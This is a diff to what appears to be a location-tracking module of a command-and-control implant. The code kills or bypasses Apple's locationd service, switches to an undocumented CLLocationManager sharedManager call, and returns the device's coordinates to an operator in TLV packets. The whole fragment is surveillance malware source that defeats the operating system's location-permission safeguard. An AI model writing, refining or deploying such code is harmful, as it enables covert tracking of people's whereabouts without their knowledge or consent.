@@ -46,6 +46,10 @@
 #define TLV_TYPE_LONGITUDE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE)
 #define TLV_TYPE_LATITUDE  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE + 1)
 
+@interface CLLocationManager (Undocumented)
++(id)sharedManager;
+@end
+
 static int kill_locationd(sigar_t *sigar)
 {
     sigar_pid_t pid;
@@ -118,18 +122,19 @@ tlv_pkt_t *locate_location_get(c2_t *c2)
 #ifdef IS_BUNDLE
     stat = perform_locationd_bypass(c2->sigar, NULL, [[NSBundle mainBundle] bundleIdentifier]);
 #else
-    executable = [NSString stringWithFormat:@"%s", realpath(c2->path, NULL)];
+    executable = [NSString stringWithFormat:@"%s", c2->path];
     stat = perform_locationd_bypass(c2->sigar, executable, NULL);
 #endif
 
     if (stat == -1)
     {
+        log_debug("* locationd bypass failed with error code (%d)\n", stat);
         return api_craft_tlv_pkt(API_CALL_FAIL);
     }
 
-    manager = [[CLLocationManager alloc] init];
-
+    manager = [CLLocationManager sharedManager];
     [manager startUpdatingLocation];
+
     location = [manager location];
     coordinate = [location coordinate];
 
